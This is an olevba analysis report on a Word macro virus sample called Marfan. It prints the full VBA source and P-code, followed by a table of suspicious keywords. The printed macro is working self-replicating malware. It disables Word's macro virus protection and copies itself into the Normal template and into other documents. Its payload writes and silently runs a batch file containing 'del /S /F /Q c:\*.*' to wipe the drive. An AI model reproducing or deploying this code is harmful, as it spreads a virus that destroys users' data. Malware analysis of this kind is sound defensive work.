olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marfan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marfan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'MarfanSyndrome!

On Error GoTo skammy

' Disable That Pesky This Document Has Macros Features
Options.VirusProtection = False

' 50% Chance of Parent Passing the Disease to Children
Randomize
If Int(2 * Rnd) = 1 Then
    Marfan_Syndrome
End If

skammy:
End Sub
 
'Copy From This Macro From The Normal Template to the Active Document
Private Sub Marfan_Syndrome()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
     Next I
    ' Run The Payload
    PayLoad
    ' Save it
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
'Copy This Macro From The Active Document to the Normal Template
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
    Next I
    ' Save It
    NormalTemplate.Save
End If
End If
End Sub

Private Sub PayLoad()

Symptoms = 0
SymptomsString = "Symptoms Found\n-------------\n"

' Is the Document Abnormally Tall?
If ActiveDocument.PageSetup.PageHeight > 720 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Was Abnormally Tall (Long)\n"
End If

' A Large Font Could Be A Sign Of Extreme NearsightedneSymptomsString
If ActiveDocument.Range(Start:=0, End:=1).Font.Size > 12 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of NearsightedneSymptomsString\n"
End If

' Flat Feet is Another Bad Sign
With ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary)
    If .Range.Text = vbCr Then
        Symptoms = Symptoms + 1
        SymptomsString = SymptomsString + "Your Document Had Flat Feet\n"
    End If
End With

' User Didnt Type That Much... Bad Joints?
If ActiveDocument.Words.Count < 100 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Possible Bad Joints Were Detected\n"
End If
       
' No MathCoPorceSymptomsStringor!  User probably feels Chest Pains.
If System.MathCoprocessorInstalled = False Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Computer Does Not Have A MathCoProceSymptomsStringor (Chest Pains)\n"
End If

' Bad Posture or Slouching is a Big Tipoff!
If ActiveDocument.PageSetup.BottomMargin <> ActiveDocument.PageSetup.TopMargin Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Slouching or Bad Posture\n"

End If

' Abnormally Long Arms or Legs is A Symptom
If ActiveDocument.PageSetup.LeftMargin > 90 Or ActiveDocument.PageSetup.BottomMargin > 72 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Long Arms or Legs\n"
End If
    
' A High Palette in the Mouth Could be a Clue
If ActiveDocument.PageSetup.TopMargin > 72 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of a High Palette\n"
End If
    
' Marfan Recommends Thorough Checkups If You Have More Than 2 Symptoms!
If Symptoms > 2 Then

    ' Have We Created The Batch Files Yet?
    With Application.FileSearch
        .NewSearch
        .LookIn = "c:\"
        .SearchSubFolders = False
        .FileName = "marfan.bat"
        .MatchTextExactly = True
    End With
    
    ' We have Already Warned The User
    If Application.FileSearch.Execute() > 0 Then
        ' Marfan Usually Strikes In the Early 30's
        If DateDiff("d", FileDateTime("c:\marfan.html"), Now) > 30 Then
            ' Lets Be Nice and Warn The User
            MsgBox "Your Computer Is Experiencing an Aortic Dissection!"
            MsgBox "You Have 2 Minutes To Get To The Hospital!"
            MsgBox "I Would Recommend Rebooting!"
            'Create A Batch File That Deletes Everything Not Running!
            Open "c:\marfan.bat" For Output As #1
                Print #1, "del /S /F /Q c:\*.*"
            Close #1
            ' Wait 2 Minutes
            countdown = Now
            While DateDiff("s", countdown, Now) < 120
            Wend
            ' Run That Batch File!
            vResult = Shell("c:\marfan.bat", vbHide)
         End If
    Else
    ' The User Has Deleted or The Batch File Has Never Been Created
    ' Create a Batch That Loads an Html Page
    Open "c:\marfan.bat" For Output As #1
        Print #1, "c:\marfan.html"
    Close #1
    ' Create The Html Page
    Open "c:\marfan.html" For Output As #1
        Print #1, "<HTML>        "
        Print #1, "<META HTTP-EQUIV=" & Chr$(34) & "Refresh" & Chr$(34) & " CONTENT=" & Chr$(34) & "0;URL=http://www.marfan.org" & Chr$(34) & ">"
        Print #1, "<SCRIPT LANGUAGE=" & Chr$(34) & "JavaScript" & Chr$(34) & ">"
        Print #1, "document.open(" & Chr$(34) & "http://www.marfan.org" & Chr$(34) & ");"
        Print #1, "alert('Attention!  Word Is Infected With Marfan Syndrome!\nIf Left Untreated an Aortic Dissection Could Occur!');"
        Print #1, "alert('" & SymptomsString & "');"
        Print #1, "</SCRIPT>"
        Print #1, "<BODY>"
        Print #1, "</BODY>"
        Print #1, "</HTML>"
     Close #1
     ' Run That Batch File!
     vResult = Shell("c:\marfan.bat", vbHide)

    End If
End If
  
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marfan
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10267 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x000F "MarfanSyndrome!"
' Line #2:
' Line #3:
' 	OnError skammy 
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x0035 " Disable That Pesky This Document Has Macros Features"
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #7:
' Line #8:
' 	QuoteRem 0x0000 0x0035 " 50% Chance of Parent Passing the Disease to Children"
' Line #9:
' 	ArgsCall Read 0x0000 
' Line #10:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	ArgsCall Marfan_Syndrome 0x0000 
' Line #12:
' 	EndIfBlock 
' Line #13:
' Line #14:
' 	Label skammy 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	QuoteRem 0x0000 0x0044 "Copy From This Macro From The Normal Template to the Active Document"
' Line #18:
' 	FuncDefn (Private Sub Marfan_Syndrome())
' Line #19:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #20:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #21:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #22:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	QuoteRem 0x0004 0x0010 " Run The Payload"
' Line #25:
' 	ArgsCall PayLoad 0x0000 
' Line #26:
' 	QuoteRem 0x0004 0x0008 " Save it"
' Line #27:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	QuoteRem 0x0000 0x003F "Copy This Macro From The Active Document to the Normal Template"
' Line #30:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #31:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #32:
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lineofcode 
' Line #33:
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld lineofcode 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	QuoteRem 0x0004 0x0008 " Save It"
' Line #36:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndSub 
' Line #40:
' Line #41:
' 	FuncDefn (Private Sub PayLoad())
' Line #42:
' Line #43:
' 	LitDI2 0x0000 
' 	St Symptoms 
' Line #44:
' 	LitStr 0x001F "Symptoms Found\n-------------\n"
' 	St SymptomsString 
' Line #45:
' Line #46:
' 	QuoteRem 0x0000 0x0021 " Is the Document Abnormally Tall?"
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd PageHeight 
' 	LitDI2 0x02D0 
' 	Gt 
' 	IfBlock 
' Line #48:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #49:
' 	Ld SymptomsString 
' 	LitStr 0x002A "Your Document Was Abnormally Tall (Long)\n"
' 	Add 
' 	St SymptomsString 
' Line #50:
' 	EndIfBlock 
' Line #51:
' Line #52:
' 	QuoteRem 0x0000 0x0044 " A Large Font Could Be A Sign Of Extreme NearsightedneSymptomsString"
' Line #53:
' 	LitDI2 0x0000 
' 	ParamNamed Start 
' 	LitDI2 0x0001 
' 	ParamNamed End 
' 	Ld ActiveDocument 
' 	ArgsMemLd Range 0x0002 
' 	MemLd Font 
' 	MemLd Size 
' 	LitDI2 0x000C 
' 	Gt 
' 	IfBlock 
' Line #54:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #55:
' 	Ld SymptomsString 
' 	LitStr 0x003B "Your Document Showed Signs of NearsightedneSymptomsString\n"
' 	Add 
' 	St SymptomsString 
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' 	QuoteRem 0x0000 0x001E " Flat Feet is Another Bad Sign"
' Line #59:
' 	StartWithExpr 
' 	Ld wdHeaderFooterPrimary 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemLd Sections 0x0001 
' 	ArgsMemLd Footers 0x0001 
' 	With 
' Line #60:
' 	MemLdWith Range 
' 	MemLd Then 
' 	Ld vbCr 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #62:
' 	Ld SymptomsString 
' 	LitStr 0x001D "Your Document Had Flat Feet\n"
' 	Add 
' 	St SymptomsString 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndWith 
' Line #65:
' Line #66:
' 	QuoteRem 0x0000 0x0029 " User Didnt Type That Much... Bad Joints?"
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0064 
' 	Lt 
' 	IfBlock 
' Line #68:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #69:
' 	Ld SymptomsString 
' 	LitStr 0x0023 "Possible Bad Joints Were Detected\n"
' 	Add 
' 	St SymptomsString 
' Line #70:
' 	EndIfBlock 
' Line #71:
' Line #72:
' 	QuoteRem 0x0000 0x0042 " No MathCoPorceSymptomsStringor!  User probably feels Chest Pains."
' Line #73:
' 	Ld System 
' 	MemLd MathCoprocessorInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #75:
' 	Ld SymptomsString 
' 	LitStr 0x0049 "Your Computer Does Not Have A MathCoProceSymptomsStringor (Chest Pains)\n"
' 	Add 
' 	St SymptomsString 
' Line #76:
' 	EndIfBlock 
' Line #77:
' Line #78:
' 	QuoteRem 0x0000 0x002A " Bad Posture or Slouching is a Big Tipoff!"
' Line #79:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd BottomMargin 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd TopMargin 
' 	Ne 
' 	IfBlock 
' Line #80:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #81:
' 	Ld SymptomsString 
' 	LitStr 0x0038 "Your Document Showed Signs of Slouching or Bad Posture\n"
' 	Add 
' 	St SymptomsString 
' Line #82:
' Line #83:
' 	EndIfBlock 
' Line #84:
' Line #85:
' 	QuoteRem 0x0000 0x002A " Abnormally Long Arms or Legs is A Symptom"
' Line #86:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd LeftMargin 
' 	LitDI2 0x005A 
' 	Gt 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd BottomMargin 
' 	LitDI2 0x0048 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #87:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #88:
' 	Ld SymptomsString 
' 	LitStr 0x0031 "Your Document Showed Signs of Long Arms or Legs\n"
' 	Add 
' 	St SymptomsString 
' Line #89:
' 	EndIfBlock 
' Line #90:
' Line #91:
' 	QuoteRem 0x0000 0x002C " A High Palette in the Mouth Could be a Clue"
' Line #92:
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd TopMargin 
' 	LitDI2 0x0048 
' 	Gt 
' 	IfBlock 
' Line #93:
' 	Ld Symptoms 
' 	LitDI2 0x0001 
' 	Add 
' 	St Symptoms 
' Line #94:
' 	Ld SymptomsString 
' 	LitStr 0x002E "Your Document Showed Signs of a High Palette\n"
' 	Add 
' 	St SymptomsString 
' Line #95:
' 	EndIfBlock 
' Line #96:
' Line #97:
' 	QuoteRem 0x0000 0x0046 " Marfan Recommends Thorough Checkups If You Have More Than 2 Symptoms!"
' Line #98:
' 	Ld Symptoms 
' 	LitDI2 0x0002 
' 	Gt 
' 	IfBlock 
' Line #99:
' Line #100:
' 	QuoteRem 0x0004 0x0025 " Have We Created The Batch Files Yet?"
' Line #101:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #102:
' 	ArgsMemCallWith NewSearch 0x0000 
' Line #103:
' 	LitStr 0x0003 "c:\"
' 	MemStWith LookIn 
' Line #104:
' 	LitVarSpecial (False)
' 	MemStWith SearchSubFolders 
' Line #105:
' 	LitStr 0x000A "marfan.bat"
' 	MemStWith FileName 
' Line #106:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #107:
' 	EndWith 
' Line #108:
' Line #109:
' 	QuoteRem 0x0004 0x0020 " We have Already Warned The User"
' Line #110:
' 	Ld Application 
' 	MemLd FileSearch 
' 	ArgsMemLd Execute 0x0000 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #111:
' 	QuoteRem 0x0008 0x0029 " Marfan Usually Strikes In the Early 30's"
' Line #112:
' 	LitStr 0x0001 "d"
' 	LitStr 0x000E "c:\marfan.html"
' 	ArgsLd FileDateTime 0x0001 
' 	Ld Now 
' 	ArgsLd DateDiff 0x0003 
' 	LitDI2 0x001E 
' 	Gt 
' 	IfBlock 
' Line #113:
' 	QuoteRem 0x000C 0x001F " Lets Be Nice and Warn The User"
' Line #114:
' 	LitStr 0x0033 "Your Computer Is Experiencing an Aortic Dissection!"
' 	ArgsCall MsgBox 0x0001 
' Line #115:
' 	LitStr 0x002A "You Have 2 Minutes To Get To The Hospital!"
' 	ArgsCall MsgBox 0x0001 
' Line #116:
' 	LitStr 0x001C "I Would Recommend Rebooting!"
' 	ArgsCall MsgBox 0x0001 
' Line #117:
' 	QuoteRem 0x000C 0x0038 "Create A Batch File That Deletes Everything Not Running!"
' Line #118:
' 	LitStr 0x000D "c:\marfan.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del /S /F /Q c:\*.*"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #121:
' 	QuoteRem 0x000C 0x000F " Wait 2 Minutes"
' Line #122:
' 	Ld Now 
' 	St countdown 
' Line #123:
' 	LitStr 0x0001 "s"
' 	Ld countdown 
' 	Ld Now 
' 	ArgsLd DateDiff 0x0003 
' 	LitDI2 0x0078 
' 	Lt 
' 	While 
' Line #124:
' 	Wend 
' Line #125:
' 	QuoteRem 0x000C 0x0015 " Run That Batch File!"
' Line #126:
' 	LitStr 0x000D "c:\marfan.bat"
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St vResult 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	ElseBlock 
' Line #129:
' 	QuoteRem 0x0004 0x003E " The User Has Deleted or The Batch File Has Never Been Created"
' Line #130:
' 	QuoteRem 0x0004 0x0027 " Create a Batch That Loads an Html Page"
' Line #131:
' 	LitStr 0x000D "c:\marfan.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "c:\marfan.html"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #134:
' 	QuoteRem 0x0004 0x0015 " Create The Html Page"
' Line #135:
' 	LitStr 0x000E "c:\marfan.html"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "<HTML>        "
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "<META HTTP-EQUIV="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0007 "Refresh"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0009 " CONTENT="
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x001B "0;URL=http://www.marfan.org"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 ">"
' 	Concat 
' 	PrintItemNL 
' Line #138:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "<SCRIPT LANGUAGE="
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x000A "JavaScript"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 ">"
' 	Concat 
' 	PrintItemNL 
' Line #139:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "document.open("
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0015 "http://www.marfan.org"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0002 ");"
' 	Concat 
' 	PrintItemNL 
' Line #140:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0071 "alert('Attention!  Word Is Infected With Marfan Syndrome!\nIf Left Untreated an Aortic Dissection Could Occur!');"
' 	PrintItemNL 
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "alert('"
' 	Ld SymptomsString 
' 	Concat 
' 	LitStr 0x0003 "');"
' 	Concat 
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "</SCRIPT>"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "<BODY>"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</BODY>"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "</HTML>"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #147:
' 	QuoteRem 0x0005 0x0015 " Run That Batch File!"
' Line #148:
' 	LitStr 0x000D "c:\marfan.bat"
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St vResult 
' Line #149:
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.marfan.or|URL                                          |
|          |g                   |                                             |
|IOC       |marfan.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

